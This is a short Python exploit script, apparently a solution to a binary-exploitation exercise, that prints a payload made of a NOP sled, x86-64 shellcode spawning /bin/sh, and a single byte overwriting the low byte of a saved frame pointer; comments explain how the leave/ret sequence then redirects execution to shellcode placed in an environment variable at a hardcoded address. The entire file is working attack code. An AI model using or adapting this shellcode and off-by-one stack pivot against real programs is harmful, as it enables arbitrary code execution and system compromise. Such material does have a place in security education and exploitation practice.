#! /usr/bin/python
import struct
import sys
#explaination: we need to return to where our shell code is.
#when the program calls getenv it saves the pointer to the output in 0x7ffffffe5c8 
#at the end of the program when it calls leave, it will put rbp inside rsp and pop the next value to rbp (now because we change rbp so it will have \xc0 in the end and when moving rbp into rsp 
# and poping after that to rbp, rsp will get incremented by 8, now rsp will have 0x7fffffffe5c8 (the pointer to our shellcode)
#after that when we call ret it will put the value of rsp inside rip and jump to that address.
#because this address contains our shellcode, it will be executed.

nop_sled = "\x90" * 99
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
last_byte_ret = "\xc0"
exploit = nop_sled + shellcode + last_byte_ret
sys.stdout.write(exploit)
